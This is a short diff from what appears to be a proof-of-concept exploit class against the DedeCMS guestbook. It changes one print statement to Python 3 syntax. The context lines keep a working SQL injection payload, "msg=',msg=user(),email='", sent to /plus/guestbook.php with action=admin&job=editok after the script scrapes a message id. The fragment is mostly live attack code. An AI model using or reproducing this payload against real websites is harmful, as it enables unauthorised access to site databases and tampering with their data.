@@ -40,7 +40,7 @@ class Fuckdede(POCBase):
 				msgid = line.get('href')[30:]
 				break
 		if msgid == None:
-			print "No msgid find,don't fuck this vulu"
+                        print ("No msgid find.")
 		payload = self.url + "/plus/guestbook.php?action=admin&job=editok&id={0}&msg=',msg=user(),email='".format(msgid)
 		req.get(target)
 		target = self.url + "/plus/guestbook.php"
